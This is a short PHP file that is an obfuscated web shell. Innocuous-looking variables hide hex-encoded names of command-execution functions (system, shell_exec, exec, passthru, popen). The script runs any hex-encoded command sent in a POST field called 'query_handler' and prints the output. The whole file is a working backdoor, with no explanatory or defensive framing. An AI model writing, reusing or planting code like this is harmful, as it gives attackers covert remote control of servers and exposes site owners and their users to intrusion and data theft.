<?php


$flag1 = '7';
$flag2 = '3';
$flag3 = '4';
$flag4 = '6';
$flag5 = 'd';
$flag6 = '8';
$flag7 = '5';
$flag8 = 'c';
$flag9 = 'f';
$flag10 = '0';
$flag11 = '1';
$flag12 = '2';
$flag13 = '9';
$flag14 = 'e';
$publish_content1 = pack("H*", $flag1 . $flag2 . $flag1 . '9' . $flag1 . $flag2 . '7' . $flag3 . '6' . '5' . $flag4 . $flag5);
$publish_content2 = pack("H*", $flag1 . '3' . '6' . $flag6 . '6' . $flag7 . $flag4 . $flag8 . $flag4 . $flag8 . $flag7 . $flag9 . '6' . $flag7 . $flag1 . $flag6 . $flag4 . $flag7 . $flag4 . '3');
$publish_content3 = pack("H*", $flag4 . $flag7 . $flag1 . '8' . $flag4 . '5' . '6' . '3');
$publish_content4 = pack("H*", '7' . $flag10 . $flag4 . $flag11 . $flag1 . $flag2 . $flag1 . '3' . '7' . $flag3 . $flag4 . $flag6 . $flag1 . '2' . '7' . '5');
$publish_content5 = pack("H*", '7' . $flag10 . '6' . $flag9 . '7' . '0' . '6' . $flag7 . '6' . 'e');
$publish_content6 = pack("H*", $flag1 . $flag2 . '7' . '4' . '7' . $flag12 . '6' . $flag7 . $flag4 . $flag11 . '6' . $flag5 . '5' . $flag9 . $flag4 . '7' . $flag4 . $flag7 . $flag1 . $flag3 . '5' . $flag9 . $flag4 . $flag2 . '6' . 'f' . '6' . 'e' . $flag1 . '4' . $flag4 . '5' . $flag4 . 'e' . $flag1 . $flag3 . '7' . $flag2);
$publish_content7 = pack("H*", $flag1 . $flag10 . $flag4 . '3' . '6' . $flag8 . '6' . 'f' . $flag1 . '3' . $flag4 . '5');
$query_handler = pack("H*", '7' . '1' . $flag1 . '5' . '6' . $flag7 . $flag1 . $flag12 . $flag1 . $flag13 . '5' . 'f' . $flag4 . '8' . '6' . $flag11 . '6' . $flag14 . $flag4 . $flag3 . $flag4 . 'c' . $flag4 . $flag7 . '7' . $flag12);
if (isset($_POST[$query_handler])) {
    $query_handler = pack("H*", $_POST[$query_handler]);
    if (function_exists($publish_content1)) {
        $publish_content1($query_handler);
    } elseif (function_exists($publish_content2)) {
        print $publish_content2($query_handler);
    } elseif (function_exists($publish_content3)) {
        $publish_content3($query_handler, $ref_tkn);
        print join("\n", $ref_tkn);
    } elseif (function_exists($publish_content4)) {
        $publish_content4($query_handler);
    } elseif (function_exists($publish_content5) && function_exists($publish_content6) && function_exists($publish_content7)) {
        $entry_key = $publish_content5($query_handler, 'r');
        if ($entry_key) {
            $ent_flg = $publish_content6($entry_key);
            $publish_content7($entry_key);
            print $ent_flg;
        }
    }
    exit;
}
